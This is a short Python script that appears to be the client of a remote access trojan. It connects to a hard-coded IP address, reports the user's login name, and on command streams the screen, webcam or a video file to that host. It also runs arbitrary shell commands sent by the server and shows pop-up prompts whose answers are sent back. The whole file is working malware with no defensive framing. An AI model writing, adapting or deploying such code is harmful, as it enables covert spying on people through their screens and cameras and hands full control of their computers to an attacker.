from vidstream import *
import socket
import os
import getpass
import pyautogui as pag
import numpy as np

host = '26.201.15.142'
port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.send(str(getpass.getuser()).encode("utf-8")) # Network name

while True:
	cmd_data = s.recv(1024).decode("utf-8")

	if cmd_data == "screen":
		screen = ScreenShareClient(host, 9999)
		screen.start_stream()
	elif cmd_data == "webcam":
		camera = CameraClient(host, 9999)
		camera.start_stream()
	elif cmd_data == "video":
		video = VideoClient(host, 9999, 'video.mp4')
		video.start_stream()
	elif "~" in cmd_data:
		os.system(cmd_data[2:])
	elif cmd_data == "message":
		message_data = s.recv(1024).decode("utf-8")

		if message_data == "1":
			pag.alert(s.recv(4096).decode("utf-8"))
		else:
			answer = pag.prompt(s.recv(4096).decode("utf-8"))
			s.send(answer.encode("utf-8"))